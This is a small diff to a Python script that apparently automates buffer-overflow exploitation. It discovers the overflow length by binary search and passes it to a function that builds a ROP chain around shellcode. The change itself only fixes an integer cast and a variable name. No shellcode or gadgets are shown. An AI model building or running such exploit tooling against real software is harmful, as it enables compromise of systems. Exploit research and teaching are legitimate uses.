@@ -44,12 +44,12 @@ def main(args):
 
     global BUFFLENGTH
     if len(args) == 4:
-        BUFFLENGTH = args[3]
+        BUFFLENGTH = int(args[3])
 
     if BUFFLENGTH == -1:
-        bufferLength = bufferDiscovery(BINARY_SEARCH, program)
+        BUFFLENGTH = bufferDiscovery(BINARY_SEARCH, program)
 
-    ROPchain = makeROPchain(SHELLCODE, bufferLength)
+    ROPchain = makeROPchain(SHELLCODE, BUFFLENGTH)
 
 def bufferDiscovery(mode, program):
     global BINARY_BITS
